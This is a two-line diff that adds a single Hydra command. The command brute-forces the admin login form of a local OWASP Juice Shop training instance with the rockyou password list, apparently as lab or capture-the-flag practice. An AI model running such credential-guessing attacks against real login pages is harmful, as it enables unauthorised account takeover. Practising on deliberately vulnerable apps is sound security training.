@@ -1,0 +1,2 @@
+command:
+hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt -s 3000 -f 127.0.0.1 http-post-form "/login:Email=^USER^&Password=^PASS^:F=incorrect"
